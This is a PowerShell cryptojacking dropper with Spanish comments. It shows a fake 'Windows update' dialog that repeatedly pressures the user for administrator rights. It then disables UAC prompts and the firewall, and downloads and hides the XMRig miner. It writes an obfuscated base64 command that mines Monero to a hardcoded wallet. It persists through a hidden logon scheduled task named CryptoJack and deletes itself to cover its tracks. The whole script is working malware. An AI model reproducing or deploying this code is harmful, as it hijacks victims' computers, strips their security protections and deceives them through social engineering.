Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
Add-Type -AssemblyName PresentationFramework


$ScriptPath = $MyInvocation.MyCommand.Path
$ScriptDir  = Split-Path -Parent $ScriptPath
$PSCommandPath = $ScriptDir + "\M1n3rPWNED.ps1"  

# Get the ID and security principal of the current user account
$myWindowsID = [Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()


# Get the security principal for the administrator role
$adminRole = [Security.Principal.WindowsBuiltInRole] "Administrator"
 


function promptAdminRights
{   Add-Type -AssemblyName System.Windows.Forms
    $global:balmsg = New-Object System.Windows.Forms.NotifyIcon
    $path = (Get-Process -id $pid).Path
    $balmsg.Icon = [System.Drawing.Icon]::ExtractAssociatedIcon($path)
    $balmsg.BalloonTipIcon = [System.Windows.Forms.ToolTipIcon]::Info
    $balmsg.BalloonTipText = "Actualización disponible `r`n Click aquí para ver"
    $balmsg.BalloonTipTitle = "Atención $Env:USERNAME"
    $balmsg.Visible = $true
    $balmsg.ShowBalloonTip(0)
    $balmsg.dispose()
    $msgBoxInput =  [System.Windows.MessageBox]::Show("Windows quiere actualizar su equipo `r`n Favor conceder permisos a PowerShell",'Actualizacion de software de Windows','YesNoCancel','Warning')
    switch  ($msgBoxInput) 
    {

        'Yes' 
        {
            
            
          Start-Process powershell "-NoProfile -W Hidden -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs;

        }
        'No'
        {
            promptAdminRights
        }
        'Cancel'
        {
            promptAdminRights
        }
    }
}

function runScript 
{
    
    #Deshabilitando prompt de User Account Control(UAC)
    Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0

    #Deshabilitando Firewall
    Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
    

    # Descargando el programa de minado    
    $PayloadPath = "C:\"
    $download = "https://github.com/xmrig/xmrig/releases/download/v6.18.0/xmrig-6.18.0-gcc-win64.zip"
    $outputPath = $PayloadPath + "Payload.zip"
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($download, $outputPath)
    attrib +h "Payload.zip"

    
    cd $PayloadPath


    if(!(Test-Path $outputPath))
    {
        runScript
    }else
    {

        #extrayendo carpeta
        Expand-Archive -LiteralPath $outputPath -DestinationPath C: -Force
        Remove-Item -Path $outputPath


        #Creando sript de minado para el ScheduledTask

        $ScheduledScriptPath = "C:\ScheduledScript64.ps1"

        $ScheduledScript = "Powershell -NoProfile -W Hidden -ExecutionPolicy Bypass -e 'DQAKACAAIAAgACAAIAAgACAAIABTAGUAdAAtAEwAbwBjAGEAdABpAG8AbgAgAEMAOgBcAHgAbQByAGkAZwAtADYALgAxADgALgAwAA0ACgAgACAAIAAgACAAIAAgAC
        AAJABSAGEAbgBkAG8AbQBJAEQAPQBHAGUAdAAtAFIAYQBuAGQAbwBtAA0ACgAgACAAIAAgACAAIAAgACAAIgB4AG0AcgBpAGcALgBlAHgAZQAgAC0AbwAgAHUAcwAt
        AHcAZQBzAHQALgBtAGkAbgBlAHgAbQByAC4AYwBvAG0AOgA0ADQANAA0ACAALQB1ACAANAAzAEgAQgBMAGcANABMAGoAYgB5AEoAWQB1AGsAVwBYAGUAdgBVAHEAdw
        BFAHQAWgBNAFgAcgBQAHkASgBOAFQAYgBZAHMAbgBLAGcAbQBVAHAARgBqAGoARABqAEcAbwBWADkAVwBxAG4AdgBNAGkAcABTAEsAdABnAFQAagBKAGQAYwBlAHAA
        TQBvAEEARwBCAHIAMQByAE0AYwB5AFcAbwBxAGMAaQBxAEEAOQA0AGYAbgA5AHUAegBEACAALQAtAHIAaQBnAC0AaQBkAD0AJABSAGEAbgBkAG8AbQBJAEQAIgAgAH
        wAIABjAG0AZAANAAoAIAAgACAAIAAgACAAIAAgAA=='"

        $ScheduledScript | out-file  $ScheduledScriptPath

        attrib +h "C:\ScheduledScript64.ps1"
        attrib +h .\xmrig-6.18.0


        #SechduledTask

        $action = New-ScheduledTaskAction -Execute 'Powershell.exe' -Argument $ScheduledScriptPath -WorkingDirectory 'C:\' 
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $Setting = New-ScheduledTaskSettingsSet -Hidden -DontStopIfGoingOnBatteries -RunOnlyIfNetworkAvailable -MultipleInstances IgnoreNew
       
       
        Register-ScheduledTask -AsJob -TaskName CryptoJack -Action $action -Trigger $trigger -Settings $Setting -RunLevel Highest -Force
        
        
        #Inicia el ScheduledTask
        Start-ScheduledTask -TaskName "CryptoJack"


        #Eliminando script
        Remove-Item $PSCommandPath -Force 
 	    Clear-RecycleBin -Force



    }
     
              
}



if (!($myWindowsID).IsInRole($adminRole))
{  
    promptAdminRights
}else
{
    runScript 
} 




